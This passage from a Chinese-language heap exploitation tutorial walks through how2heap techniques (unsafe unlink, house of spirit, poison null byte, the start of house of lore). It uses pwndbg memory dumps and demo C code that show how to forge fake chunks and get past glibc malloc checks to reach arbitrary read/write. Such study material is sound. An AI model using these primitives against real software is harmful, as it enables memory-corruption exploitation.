<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000602058	0x00007fffffffe3d0</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000080	0x0000000000000090</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000020ee1</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">Pwndbg&gt; p chunk0_ptr</span><br><span class="line"><span class="variable">$8</span> = (uint64_t *) 0x603010</span><br></pre></td></tr></table></figure>

<p>然后我们对<strong>chunk0_ptr</strong> 进行操作，就能得到一个地址写。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/40gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x603010:	0x4141414142424242	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000602058	0x00007fffffffe3d0</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000080	0x0000000000000090</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603120:	0x0000000000000000	0x0000000000020ee1</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">Pwndbg&gt; x/gx chunk0_ptr</span><br><span class="line">0x603010:	0x4141414142424242</span><br><span class="line">Pwndbg&gt;</span><br></pre></td></tr></table></figure>



<p>总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。</p>
<h3 id="0x06-house-of-spirit"><a href="#0x06-house-of-spirit" class="headerlink" title="0x06 house_of_spirit"></a>0x06 house_of_spirit</h3><p>Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. </p>
<p>通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。</p>
<p><strong>house of spirit</strong> 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">       <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>伪造情况如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="number">0xc2</span>, <span class="number">0x40</span>, <span class="number">0x7fffffffe3ae</span>, <span class="number">0x7ffff7ababe5</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x1234</span>&#125;</span><br><span class="line">Pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> (*)[<span class="number">10</span>]) <span class="number">0x7fffffffe370</span></span><br></pre></td></tr></table></figure>



<p>其中 0x40 是chunk size，0x1234 是 nextsize。伪造 chunk 时需要绕过一些检查，首先是标志位，<code>PREV_INUSE</code> 位并不影响 free 的过程，但 <code>IS_MMAPPED</code> 位和 <code>NON_MAIN_ARENA</code> 位都要为零。其次，在 64 位系统中 fast chunk 的大小要在 32~128 字节之间。最后，是 next chunk 的大小，必须大于 <code>2*SIZE_SZ</code>（即大于16），小于 <code>av-&gt;system_mem</code>（即小于128kb），才能绕过对 next chunk 大小的检查。</p>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br></pre></td></tr></table></figure>



<p>size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 0 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 2 位表示此块是否由 mmap 分配, 如果 此位为 0 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 3 位表示此块是否不属于 main_arena, 在之后会提到main_arena是主线程用于保存堆状态的结构, 如果此位为 0 则表示此块是在 主线程中分配的  </p>
<hr>
<p>然后我们修改指针 a  指向fake chunk</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">23</span>         <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">  <span class="number">24</span> 	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">  <span class="number">25</span></span><br><span class="line">  <span class="number">26</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">  <span class="number">27</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">► <span class="number">28</span> 	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  <span class="number">29</span></span><br><span class="line">  <span class="number">30</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">  <span class="number">31</span> 	<span class="built_in">free</span>(a);</span><br><span class="line">  <span class="number">32</span></span><br><span class="line">  <span class="number">33</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>

<p>修改后如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; p a                                                        </span><br><span class="line"><span class="variable">$11</span> = (unsigned long long *) 0x7fffffffe380--&gt; <span class="variable">$9</span> = (unsigned long long **) 0x7fffffffe368</span><br></pre></td></tr></table></figure>

<p>成功指向了 fake chunk。当我free a的时候，系统会将 fake chunk 当做一块fastbins 处理，放到fastbins数组里。当我们再malloc的时候。我们就得到一块指向 stack 的 chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fffffffe370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Pwndbg&gt; x/10gx &amp;fake_chunks</span><br><span class="line">0x7fffffffe370:	0x00000000000000c2	0x0000000000000040</span><br><span class="line">0x7fffffffe380:	0x0000000000000000	0x00007ffff7ababe5</span><br><span class="line">0x7fffffffe390:	0x0000000000000001	0x00000000004008ed</span><br><span class="line">0x7fffffffe3a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fffffffe3b0:	0x00000000004008a0	0x0000000000001234</span><br></pre></td></tr></table></figure>

<p>所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。</p>
<p>该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。</p>
<h3 id="0x07-poison-null-byte"><a href="#0x07-poison-null-byte" class="headerlink" title="0x07 poison_null_byte"></a>0x07 poison_null_byte</h3><p>off-one-by-one 的经典例子，一个0字节溢出。在一个字节溢出中，通常有以下情景：</p>
<ol>
<li>扩展块</li>
<li>收缩块</li>
</ol>
<p>首先，我们创建了 a b c barrier 四个chunk。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">a = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"><span class="keyword">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span></span><br><span class="line">	<span class="string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span></span><br><span class="line"><span class="comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span></span><br><span class="line"><span class="comment"> * the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">b = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">c = (<span class="keyword">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">barrier =  <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span></span><br><span class="line">	<span class="string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);</span><br></pre></td></tr></table></figure>

<p>值得一提的是， barrier 这个chunk是用来防止 free c 的时候被放入 top-chunk。以及 b c 的 chunk 大小不能为 fastbins chunk size。因为 fastbins chunk 在被释放后不会合并。chunk a的作用是用来制造单字节溢出。</p>
<p>在进行一字节溢出之前，由于我们通过 chunk a 的单字节溢出修改了 chunk b 的 size ，为了绕过 unlink 的checnk ，我们先伪造一个 c prev_size。 计算方法如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.prev_size = b_size &amp; 0xff00</span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910171629.png"></a></p>
<p>计算结果就是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x200 = 0x211 &amp; 0xff00</span><br></pre></td></tr></table></figure>

<p>正好是 NULL 字节溢出之后的值。紧接着我们 free 掉 chunk b。此时 chunk 布局如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/124gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000111         &lt;-- chunk a</span><br><span class="line">0x603010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6030f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603110:	0x0000000000000000	0x0000000000000211      &lt;--- chunk b [was free]</span><br><span class="line">0x603120:	0x00007ffff7dd1b58	0x00007ffff7dd1b58           fd ,bk</span><br><span class="line">0x603130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">0x603300:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603310:	0x0000000000000200	0x0000000000000000          fake c.prev.size </span><br><span class="line">0x603320:	0x0000000000000210	0x0000000000000110    &lt;--- chunk c</span><br><span class="line">0x603330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603350:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>



<p>Free list</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603110 —▸ 0x7ffff7dd1b58 (main_arena+88) ◂— 0x603110</span><br></pre></td></tr></table></figure>

<p>然后我们利用 一字节溢出 修改 chunk b size。</p>
<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910173014.png"></a></p>
<p>这个时候我们发现 chunk b 的 size 已经成功被修改，同时我们也 fake 了 个 chunk c。</p>
<p>*** bypass : chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))** </p>
<p>紧接着我们 create chunk b1 ，系统会从 free 掉的chunk b 中（已经放入 unsortedbin 取出合适的大小）。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; p b1</span><br><span class="line"><span class="variable">$25</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br><span class="line">PwnLife&gt; p b</span><br><span class="line"><span class="variable">$26</span> = (uint8_t *) 0x603120 <span class="string">&quot;H\035\335\367\377\177&quot;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910174002.png"></a></p>
<p>我们注意到几个地方：</p>
<ol>
<li>chunk b1 的位置就是 chunk b 的位置</li>
<li>这个时候 b1 和 c 之间有个 chunk b，这个时候 chunk c 的 prev_size 本应该变为 0xf0。但是事实上是</li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/30gx 0x603330-0x20</span><br><span class="line">0x603310:	0x00000000000000f0	0x0000000000000000              &lt; --- fake chunk c </span><br><span class="line">0x603320:	0x0000000000000210	0x0000000000000110        &lt; --- chunk c</span><br><span class="line">0x603330:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603340:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603350:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603360:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603370:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603380:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603390:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6033f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">PwnLife&gt; p c</span><br><span class="line"><span class="variable">$30</span> = (uint8_t *) 0x603330 <span class="string">&quot;&quot;</span>               &lt;--- chunk c ptr</span><br></pre></td></tr></table></figure>

<p>这是由于我们 fake 了一个 c.prev_size 系统修改的是我们的 fake  c.prev_size。所以 chunk c 依然认为 chunk b 的地方有一个大小为 0x210 的 free chunk 。然后我们在 create 一个 chunk b2。</p>
<p>然后就是，我们先后 free b1 ，c。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">95</span> 	<span class="built_in">free</span>(b1);</span><br><span class="line"><span class="number">96</span> 	<span class="built_in">free</span>(c);</span><br></pre></td></tr></table></figure>

<p>先 free b1，这个时候 chunk c 会认为 b1 就是 chunk b。当我们 free chunk c 的时候，chunk会和chunk b1合并。由于 chunk c 认为 chunk b1 依旧是 chunk b。因此会把中间的 chunk c 吞并。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x603110 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0,</span><br><span class="line">  size = 0x321,</span><br><span class="line">  fd = 0x6032b0,</span><br><span class="line">  bk = 0x7ffff7dd1b58 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/20180910175250.png"></a></p>
<p>此时 chunk b2 已经被吞并。</p>
<p>然后我们在把这块 chunk create出来。假设我们之前对 chunk b2 写的是一个指针。此时我们 得到的新 chunk d。我们可以对chunk b2的内容进行任意读写了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">98</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);</span><br><span class="line">   <span class="number">99</span> 	d = <span class="built_in">malloc</span>(<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">100</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;d: %p\n&quot;</span>,d);</span><br><span class="line">  <span class="number">101</span></span><br><span class="line">► <span class="number">102</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);</span><br><span class="line">  <span class="number">103</span> 	<span class="built_in">memset</span>(d,<span class="string">&#x27;D&#x27;</span>,<span class="number">0x300</span>);</span><br><span class="line">  <span class="number">104</span></span><br><span class="line">  <span class="number">105</span> 	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New b2 content:\n%s\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure>



<h3 id="0x08-house-of-lore"><a href="#0x08-house-of-lore" class="headerlink" title="0x08 house_of_lore"></a>0x08 house_of_lore</h3><p>house of lore 技术主要是用来伪造一个 small bin 链。</p>
<ul>
<li><p>House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。</p>
</li>
<li><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
</li>
<li><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p>
</li>
</ul>
<p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">   If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">   hold one size each, no searching within bins is necessary.</span><br><span class="line">   (For a large request, we need to wait 